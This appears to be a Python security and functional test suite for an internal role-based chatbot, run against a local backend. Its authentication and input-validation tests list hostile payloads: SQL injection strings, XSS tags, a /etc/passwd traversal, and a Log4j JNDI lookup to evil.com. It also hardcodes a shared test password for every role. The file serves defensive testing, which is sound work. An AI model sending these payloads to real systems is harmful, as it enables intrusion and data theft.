#!/usr/bin/env python3
"""
Comprehensive Test Suite for FinSolve Internal Chatbot
Tests: Security, Authentication, RBAC, Chat UI, Error Handling, and Edge Cases
"""

import requests
import json
import time
import sys
from datetime import datetime
from typing import Dict, List, Any

# Configuration
BACKEND_URL = "http://127.0.0.1:8000"
FRONTEND_URL = "http://localhost:8501"

# Test Users with Different Roles
TEST_USERS = {
    "admin": {"username": "admin", "password": "password123", "expected_role": "C-Level"},
    "finance_user": {"username": "finance_user", "password": "password123", "expected_role": "Finance"},
    "marketing_user": {"username": "marketing_user", "password": "password123", "expected_role": "Marketing"},
    "hr_user": {"username": "hr_user", "password": "password123", "expected_role": "HR"},
    "engineering_user": {"username": "engineering_user", "password": "password123", "expected_role": "Engineering"},
    "employee": {"username": "employee", "password": "password123", "expected_role": "Employee"},
}

class TestResults:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = []
        self.warnings = []
        self.security_issues = []
        
    def add_pass(self, test_name: str):
        self.passed += 1
        print(f"✅ PASS: {test_name}")
        
    def add_fail(self, test_name: str, error: str):
        self.failed += 1
        self.errors.append(f"{test_name}: {error}")
        print(f"❌ FAIL: {test_name} - {error}")
        
    def add_warning(self, test_name: str, warning: str):
        self.warnings.append(f"{test_name}: {warning}")
        print(f"⚠️  WARN: {test_name} - {warning}")
        
    def add_security_issue(self, issue: str):
        self.security_issues.append(issue)
        print(f"🔒 SECURITY: {issue}")

def test_backend_health(results: TestResults):
    """Test if backend is running and healthy"""
    print("\n🔍 Testing Backend Health...")
    try:
        response = requests.get(f"{BACKEND_URL}/health", timeout=5)
        if response.status_code == 200:
            results.add_pass("Backend Health Check")
            return True
        else:
            results.add_fail("Backend Health Check", f"Status code: {response.status_code}")
            return False
    except Exception as e:
        results.add_fail("Backend Health Check", f"Connection error: {str(e)}")
        return False

def test_authentication_security(results: TestResults):
    """Test authentication security scenarios"""
    print("\n🔐 Testing Authentication Security...")
    
    # Test 1: Invalid credentials
    try:
        response = requests.post(
            f"{BACKEND_URL}/auth/login",
            data={"username": "invalid_user", "password": "wrong_password"},
            timeout=10
        )
        if response.status_code == 401:
            results.add_pass("Invalid credentials rejection")
        else:
            results.add_fail("Invalid credentials rejection", f"Expected 401, got {response.status_code}")
    except Exception as e:
        results.add_fail("Invalid credentials test", str(e))
    
    # Test 2: SQL Injection attempts
    sql_injection_payloads = [
        "admin'; DROP TABLE users; --",
        "admin' OR '1'='1",
        "admin' UNION SELECT * FROM users --"
    ]
    
    for payload in sql_injection_payloads:
        try:
            response = requests.post(
                f"{BACKEND_URL}/auth/login",
                data={"username": payload, "password": "password123"},
                timeout=10
            )
            if response.status_code == 401:
                results.add_pass(f"SQL Injection protection: {payload[:20]}...")
            else:
                results.add_security_issue(f"Potential SQL injection vulnerability with payload: {payload}")
        except Exception as e:
            results.add_warning(f"SQL injection test error", str(e))
    
    # Test 3: Empty credentials
    try:
        response = requests.post(
            f"{BACKEND_URL}/auth/login",
            data={"username": "", "password": ""},
            timeout=10
        )
        if response.status_code in [400, 422]:
            results.add_pass("Empty credentials rejection")
        else:
            results.add_fail("Empty credentials rejection", f"Expected 400/422, got {response.status_code}")
    except Exception as e:
        results.add_fail("Empty credentials test", str(e))

def test_role_based_access_control(results: TestResults):
    """Test RBAC functionality"""
    print("\n👥 Testing Role-Based Access Control...")
    
    # Test each user role
    for user_key, user_data in TEST_USERS.items():
        print(f"\n  Testing user: {user_key}")
        
        # Login
        try:
            login_response = requests.post(
                f"{BACKEND_URL}/auth/login",
                data={"username": user_data["username"], "password": user_data["password"]},
                timeout=10
            )
            
            if login_response.status_code != 200:
                results.add_fail(f"Login for {user_key}", f"Status: {login_response.status_code}")
                continue
                
            token_data = login_response.json()
            access_token = token_data.get("access_token")
            
            if not access_token:
                results.add_fail(f"Token retrieval for {user_key}", "No access token received")
                continue
                
            results.add_pass(f"Login for {user_key}")
            
            # Test profile access
            headers = {"Authorization": f"Bearer {access_token}"}
            profile_response = requests.get(f"{BACKEND_URL}/api/v1/user/profile", headers=headers, timeout=10)
            
            if profile_response.status_code == 200:
                profile = profile_response.json()
                actual_role = profile.get("role")
                expected_role = user_data["expected_role"]
                
                if actual_role == expected_role:
                    results.add_pass(f"Role verification for {user_key}")
                else:
                    results.add_fail(f"Role verification for {user_key}", f"Expected {expected_role}, got {actual_role}")
            else:
                results.add_fail(f"Profile access for {user_key}", f"Status: {profile_response.status_code}")
            
            # Test chat functionality
            test_queries = [
                "What is our company policy?",
                "Show me financial data",
                "What are the marketing metrics?",
                "Tell me about engineering processes"
            ]
            
            for query in test_queries[:2]:  # Test first 2 queries to save time
                chat_response = requests.post(
                    f"{BACKEND_URL}/api/v1/chat",
                    json={"query": query},
                    headers=headers,
                    timeout=30
                )
                
                if chat_response.status_code == 200:
                    chat_data = chat_response.json()
                    if chat_data.get("response"):
                        results.add_pass(f"Chat functionality for {user_key}")
                        
                        # Check if chunk details are present
                        if chat_data.get("chunk_details"):
                            results.add_pass(f"Chunk analysis for {user_key}")
                        else:
                            results.add_warning(f"Chunk analysis for {user_key}", "No chunk details found")
                        
                        # Check accuracy score
                        accuracy = chat_data.get("accuracy_score", 0)
                        if accuracy > 0:
                            results.add_pass(f"Accuracy calculation for {user_key}")
                            if accuracy < 70:
                                results.add_warning(f"Low accuracy for {user_key}", f"Accuracy: {accuracy}%")
                        else:
                            results.add_warning(f"Accuracy calculation for {user_key}", "No accuracy score")
                        
                        break  # Only test one successful query per user
                else:
                    results.add_fail(f"Chat for {user_key}", f"Status: {chat_response.status_code}")
                    
        except Exception as e:
            results.add_fail(f"RBAC test for {user_key}", str(e))

def test_unauthorized_access(results: TestResults):
    """Test unauthorized access scenarios"""
    print("\n🚫 Testing Unauthorized Access...")
    
    # Test 1: Access without token
    try:
        response = requests.get(f"{BACKEND_URL}/api/v1/user/profile", timeout=10)
        if response.status_code == 401:
            results.add_pass("Unauthorized profile access blocked")
        else:
            results.add_security_issue(f"Profile accessible without token: {response.status_code}")
    except Exception as e:
        results.add_fail("Unauthorized access test", str(e))
    
    # Test 2: Invalid token
    try:
        headers = {"Authorization": "Bearer invalid_token_12345"}
        response = requests.get(f"{BACKEND_URL}/api/v1/user/profile", headers=headers, timeout=10)
        if response.status_code == 401:
            results.add_pass("Invalid token rejected")
        else:
            results.add_security_issue(f"Invalid token accepted: {response.status_code}")
    except Exception as e:
        results.add_fail("Invalid token test", str(e))
    
    # Test 3: Chat without authentication
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/v1/chat",
            json={"query": "test query"},
            timeout=10
        )
        if response.status_code == 401:
            results.add_pass("Unauthorized chat access blocked")
        else:
            results.add_security_issue(f"Chat accessible without auth: {response.status_code}")
    except Exception as e:
        results.add_fail("Unauthorized chat test", str(e))

def test_input_validation(results: TestResults):
    """Test input validation and sanitization"""
    print("\n🧹 Testing Input Validation...")
    
    # Get a valid token first
    login_response = requests.post(
        f"{BACKEND_URL}/auth/login",
        data={"username": "admin", "password": "password123"},
        timeout=10
    )
    
    if login_response.status_code != 200:
        results.add_fail("Input validation setup", "Could not get admin token")
        return
    
    token = login_response.json().get("access_token")
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test malicious inputs
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j style
        "' OR 1=1 --",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]
    
    for malicious_input in malicious_inputs:
        try:
            response = requests.post(
                f"{BACKEND_URL}/api/v1/chat",
                json={"query": malicious_input},
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                response_data = response.json()
                response_text = response_data.get("response", "")
                
                # Check if malicious input is reflected back
                if malicious_input in response_text:
                    results.add_security_issue(f"Potential XSS/injection: {malicious_input[:30]}...")
                else:
                    results.add_pass(f"Input sanitization: {malicious_input[:30]}...")
            else:
                results.add_warning(f"Input validation test", f"Unexpected status: {response.status_code}")
                
        except Exception as e:
            results.add_warning(f"Input validation error", str(e))

def test_session_management(results: TestResults):
    """Test session management and token handling"""
    print("\n⏰ Testing Session Management...")
    
    # Test token refresh
    try:
        login_response = requests.post(
            f"{BACKEND_URL}/auth/login",
            data={"username": "admin", "password": "password123"},
            timeout=10
        )
        
        if login_response.status_code == 200:
            token_data = login_response.json()
            refresh_token = token_data.get("refresh_token")
            
            if refresh_token:
                # Test token refresh
                refresh_response = requests.post(
                    f"{BACKEND_URL}/auth/refresh",
                    params={"refresh_token": refresh_token},
                    timeout=10
                )
                
                if refresh_response.status_code == 200:
                    results.add_pass("Token refresh functionality")
                else:
                    results.add_fail("Token refresh", f"Status: {refresh_response.status_code}")
            else:
                results.add_warning("Token refresh", "No refresh token provided")
        else:
            results.add_fail("Session management setup", "Could not login")
            
    except Exception as e:
        results.add_fail("Session management test", str(e))

def test_error_handling(results: TestResults):
    """Test error handling scenarios"""
    print("\n💥 Testing Error Handling...")
    
    # Get valid token
    login_response = requests.post(
        f"{BACKEND_URL}/auth/login",
        data={"username": "admin", "password": "password123"},
        timeout=10
    )
    
    if login_response.status_code != 200:
        results.add_fail("Error handling setup", "Could not get admin token")
        return
    
    token = login_response.json().get("access_token")
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test various error scenarios
    error_tests = [
        {"json": {}, "name": "Empty JSON"},
        {"json": {"query": ""}, "name": "Empty query"},
        {"json": {"query": "a" * 10000}, "name": "Very long query"},
        {"json": {"invalid_field": "test"}, "name": "Invalid field"},
        {"json": {"query": None}, "name": "Null query"},
    ]
    
    for test in error_tests:
        try:
            response = requests.post(
                f"{BACKEND_URL}/api/v1/chat",
                json=test["json"],
                headers=headers,
                timeout=15
            )
            
            # Should handle gracefully (not crash)
            if response.status_code in [200, 400, 422]:
                results.add_pass(f"Error handling: {test['name']}")
            else:
                results.add_warning(f"Error handling: {test['name']}", f"Status: {response.status_code}")
                
        except Exception as e:
            results.add_fail(f"Error handling: {test['name']}", str(e))

def test_performance_and_limits(results: TestResults):
    """Test performance and rate limiting"""
    print("\n⚡ Testing Performance & Limits...")
    
    # Get valid token
    login_response = requests.post(
        f"{BACKEND_URL}/auth/login",
        data={"username": "admin", "password": "password123"},
        timeout=10
    )
    
    if login_response.status_code != 200:
        results.add_fail("Performance test setup", "Could not get admin token")
        return
    
    token = login_response.json().get("access_token")
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test response time
    start_time = time.time()
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/v1/chat",
            json={"query": "What is our company policy?"},
            headers=headers,
            timeout=30
        )
        end_time = time.time()
        response_time = end_time - start_time
        
        if response.status_code == 200:
            if response_time < 10:  # Should respond within 10 seconds
                results.add_pass(f"Response time: {response_time:.2f}s")
            else:
                results.add_warning("Response time", f"Slow response: {response_time:.2f}s")
        else:
            results.add_fail("Performance test", f"Status: {response.status_code}")
            
    except Exception as e:
        results.add_fail("Performance test", str(e))

def test_data_access_controls(results: TestResults):
    """Test that users can only access data they're authorized for"""
    print("\n🔐 Testing Data Access Controls...")
    
    # Test different users accessing different document types
    access_tests = [
        {"user": "finance_user", "should_access": ["quarterly_financial_report"], "should_deny": ["engineering_master_doc"]},
        {"user": "marketing_user", "should_access": ["market_report_q4_2024"], "should_deny": ["quarterly_financial_report"]},
        {"user": "employee", "should_access": ["employee_handbook"], "should_deny": ["quarterly_financial_report"]},
    ]
    
    for test in access_tests:
        user_data = TEST_USERS.get(test["user"])
        if not user_data:
            continue
            
        # Login
        try:
            login_response = requests.post(
                f"{BACKEND_URL}/auth/login",
                data={"username": user_data["username"], "password": user_data["password"]},
                timeout=10
            )
            
            if login_response.status_code != 200:
                results.add_fail(f"Data access test login: {test['user']}", "Login failed")
                continue
                
            token = login_response.json().get("access_token")
            headers = {"Authorization": f"Bearer {token}"}
            
            # Test queries that should return data
            for doc_type in test["should_access"]:
                query = f"Tell me about {doc_type.replace('_', ' ')}"
                response = requests.post(
                    f"{BACKEND_URL}/api/v1/chat",
                    json={"query": query},
                    headers=headers,
                    timeout=20
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("sources") and len(data["sources"]) > 0:
                        results.add_pass(f"Authorized access: {test['user']} -> {doc_type}")
                    else:
                        results.add_warning(f"Authorized access: {test['user']} -> {doc_type}", "No sources returned")
                else:
                    results.add_fail(f"Authorized access: {test['user']} -> {doc_type}", f"Status: {response.status_code}")
            
            # Test queries that should be restricted
            for doc_type in test["should_deny"]:
                query = f"Show me {doc_type.replace('_', ' ')} information"
                response = requests.post(
                    f"{BACKEND_URL}/api/v1/chat",
                    json={"query": query},
                    headers=headers,
                    timeout=20
                )
                
                if response.status_code == 200:
                    data = response.json()
                    # Should either have no sources or limited sources
                    sources = data.get("sources", [])
                    restricted_sources = [s for s in sources if doc_type in s]
                    
                    if len(restricted_sources) == 0:
                        results.add_pass(f"Access restriction: {test['user']} -X-> {doc_type}")
                    else:
                        results.add_security_issue(f"Unauthorized access: {test['user']} accessed {doc_type}")
                else:
                    results.add_warning(f"Access restriction test: {test['user']} -> {doc_type}", f"Status: {response.status_code}")
                    
        except Exception as e:
            results.add_fail(f"Data access test: {test['user']}", str(e))

def generate_test_report(results: TestResults):
    """Generate comprehensive test report"""
    print("\n" + "="*80)
    print("📊 COMPREHENSIVE TEST REPORT")
    print("="*80)
    
    total_tests = results.passed + results.failed
    success_rate = (results.passed / total_tests * 100) if total_tests > 0 else 0
    
    print(f"\n📈 SUMMARY:")
    print(f"   ✅ Passed: {results.passed}")
    print(f"   ❌ Failed: {results.failed}")
    print(f"   ⚠️  Warnings: {len(results.warnings)}")
    print(f"   🔒 Security Issues: {len(results.security_issues)}")
    print(f"   📊 Success Rate: {success_rate:.1f}%")
    
    if results.errors:
        print(f"\n❌ FAILED TESTS:")
        for error in results.errors:
            print(f"   • {error}")
    
    if results.warnings:
        print(f"\n⚠️  WARNINGS:")
        for warning in results.warnings:
            print(f"   • {warning}")
    
    if results.security_issues:
        print(f"\n🔒 SECURITY ISSUES:")
        for issue in results.security_issues:
            print(f"   • {issue}")
    
    # Overall assessment
    print(f"\n🎯 OVERALL ASSESSMENT:")
    if len(results.security_issues) > 0:
        print("   🚨 CRITICAL: Security vulnerabilities found!")
    elif results.failed > results.passed:
        print("   ❌ POOR: More tests failed than passed")
    elif success_rate >= 90:
        print("   🌟 EXCELLENT: High success rate with minimal issues")
    elif success_rate >= 80:
        print("   ✅ GOOD: Most tests passed with some minor issues")
    elif success_rate >= 70:
        print("   ⚠️  FAIR: Acceptable but needs improvement")
    else:
        print("   ❌ POOR: Significant issues need attention")
    
    # Recommendations
    print(f"\n💡 RECOMMENDATIONS:")
    if len(results.security_issues) > 0:
        print("   1. Address all security vulnerabilities immediately")
    if results.failed > 0:
        print("   2. Fix failed test cases")
    if len(results.warnings) > 5:
        print("   3. Review and address warning messages")
    print("   4. Consider implementing additional monitoring")
    print("   5. Regular security audits recommended")
    
    return {
        "passed": results.passed,
        "failed": results.failed,
        "warnings": len(results.warnings),
        "security_issues": len(results.security_issues),
        "success_rate": success_rate,
        "errors": results.errors,
        "warnings_list": results.warnings,
        "security_issues_list": results.security_issues
    }

def main():
    """Run comprehensive test suite"""
    print("🚀 Starting Comprehensive Test Suite for FinSolve Internal Chatbot")
    print(f"⏰ Test started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    results = TestResults()
    
    # Run all test categories
    if not test_backend_health(results):
        print("❌ Backend not available. Stopping tests.")
        return
    
    test_authentication_security(results)
    test_role_based_access_control(results)
    test_unauthorized_access(results)
    test_input_validation(results)
    test_session_management(results)
    test_error_handling(results)
    test_performance_and_limits(results)
    test_data_access_controls(results)
    
    # Generate final report
    report = generate_test_report(results)
    
    # Save report to file
    report_data = {
        "timestamp": datetime.now().isoformat(),
        "summary": report,
        "detailed_results": {
            "errors": results.errors,
            "warnings": results.warnings,
            "security_issues": results.security_issues
        }
    }
    
    with open(f"test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
        json.dump(report_data, f, indent=2)
    
    print(f"\n📄 Detailed report saved to: test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    print("🏁 Test suite completed!")

if __name__ == "__main__":
    main()